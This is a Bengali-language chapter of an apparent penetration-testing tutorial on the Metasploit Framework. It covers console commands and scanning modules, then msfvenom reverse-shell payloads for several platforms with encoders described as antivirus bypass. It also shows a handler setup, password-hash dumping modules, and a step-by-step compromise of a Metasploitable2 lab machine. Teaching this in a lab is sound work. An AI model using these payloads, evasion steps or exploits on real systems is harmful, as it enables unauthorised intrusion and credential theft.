# অধ্যায় ২৭: Metasploit Framework (A-Z)

## সহজ কথায়:
Metasploit = হ্যাকারদের Swiss Army knife। exploit বাছো → target set করো → run করো → shell পাও। এত সহজ!

---

## ২৭.১ Metasploit Basics

### Start Metasploit:

```bash
# Terminal খোলো:
msfconsole

# Splash screen + prompt:
msf6 >
```

### Common Commands:

```bash
# Help:
help

# Search exploits:
search apache
search wordpress
search eternalblue
search type:exploit platform:linux

# Module info:
info exploit/multi/http/struts2_content_type_ognl

# Select module:
use exploit/multi/http/struts2_content_type_ognl

# Show options:
show options
show targets
show payloads
show advanced

# Set options:
set RHOSTS 192.168.1.10
set RPORT 8080
set TARGET 0

# Run exploit:
run
# or
exploit

# Background session:
background
# বা Ctrl+Z

# List sessions:
sessions
sessions -i 1  # interact with session 1

# Back:
back

# Exit:
exit
```

---

## ২৭.২ Module Types

### 6 Module Types:

| Module | কী করে | উদাহরণ |
|--------|--------|---------|
| **Auxiliary** | Scan, recon, fuzz (no shell) | scanner/portscan/tcp |
| **Exploit** | Vulnerability exploit করে | exploit/multi/http/struts2 |
| **Payload** | Shell code | linux/x64/meterpreter/reverse_tcp |
| **Post** | Post-exploitation | post/linux/gather/hashdump |
| **Encoder** | Payload encode (AV bypass) | encoder/x64/xor |
| **NOP** | NOP sled generate | x64/simple |

### Auxiliary Examples:

```bash
# Port scan:
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.10
set PORTS 1-1000
run

# SSH version scan:
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.10
run

# HTTP directory scan:
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.10
set PATH /
run

# SMB share scan:
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.10
run
```

---

## ২৭.৩ Payload তৈরি (msfvenom)

msfvenom = payload generator। বিভিন্ন format-এ payload তৈরি করে।

### Payload Types:

```bash
# Staged (small → large payload in stages):
windows/meterpreter/reverse_tcp       # Stage 1: connect → Stage 2: full meterpreter
linux/x86/meterpreter/reverse_tcp

# Stageless (full payload — bigger):
windows/meterpreter_reverse_tcp       # Underscore! Full payload
linux/x86/meterpreter_reverse_tcp
```

### Generate Payloads:

```bash
# Linux reverse shell (ELF):
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf

# Windows reverse shell (EXE):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe

# PHP:
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php

# Python:
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.py

# ASP (for IIS):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f asp -o shell.asp

# WAR (for Tomcat):
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f war -o shell.war

# Android APK:
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -o evil.apk

# MacOS:
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f macho -o shell.macho
```

### Encoders (AV Bypass):

```bash
# List encoders:
msfvenom -l encoders

# Basic encoding:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Encrypt payload:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 --encrypt xor --encrypt-key secret -f exe -o encrypted.exe
```

---

## ২৭.৪ Meterpreter — Complete Guide

Already covered detailed commands in Chapter 26. Key reminders:

```bash
# Start handler for meterpreter:
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
run

# Once session obtained:
help          # দেখো সব command
sysinfo       # System info
getuid        # Current user
getsystem     # Try root
```

### Post-Exploitation Modules:

```bash
# Linux hashdump:
use post/linux/gather/hashdump
set SESSION 1
run

# Linux enum:
use post/linux/gather/enum_configs
set SESSION 1
run

# Check containers:
use post/linux/gather/checkcontainer
set SESSION 1
run

# Windows hashdump (SAM):
use post/windows/gather/hashdump
set SESSION 1
run

# Windows privilege escalation check:
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

---

## ২৭.৫ Armitage (GUI Metasploit)

Armitage = Metasploit-এর graphical interface।

```bash
# Start:
sudo armitage

# Connect to Metasploit:
Host: 127.0.0.1
Port: 55553

# Features:
# - Left panel: Module browser (search + select)
# - Right panel: Targets (hosts discovered)
# - Top: Attack menu
# - Bottom: Console
# - Visual: Hack flow diagram দেখায়
```

---

## ২৭.৬ Metasploitable2 Hack — Step by Step

```
Target: Metasploitable2 (192.168.56.102)

Vulnerability: vsftpd 2.3.4 backdoor
```

### Full Walkthrough:

```bash
# Step 1: msfconsole শুরু
msfconsole

# Step 2: Exploit খুঁজো
search vsftpd

# Step 3: Module select
use exploit/unix/ftp/vsftpd_234_backdoor

# Step 4: Options দেখো
show options
show payloads

# Step 5: Configure
set RHOSTS 192.168.56.102
set payload cmd/unix/interact

# Step 6: Verify
check

# Step 7: Exploit!
exploit

# Step 8: Shell পেলে
whoami          # → root!
id              # uid=0(root) gid=0(root)
cat /etc/shadow  # Password hashes!
```

### More Exploits for Metasploitable2:

```bash
# UnrealIRCd backdoor:
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.102
set RPORT 6667
exploit

# Samba (username map script):
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.102
exploit

# Tomcat manager default creds:
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.56.102
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
exploit
```

---

## 📌 মনে রাখো

| Concept | Command/Use |
|---------|-------------|
| **Search** | `search eternalblue` |
| **Use** | `use exploit/...` |
| **Set** | `set RHOSTS target` |
| **Run** | `run` or `exploit` |
| **Sessions** | `sessions -i 1` |
| **msfvenom** | `msfvenom -p ... -f exe -o shell.exe` |
| **Meterpreter** | `sysinfo, getuid, screenshot` |
| **Armitage** | GUI version of MSF |

**পরবর্তী — Top 10 Kali Linux Tools! 🔧**
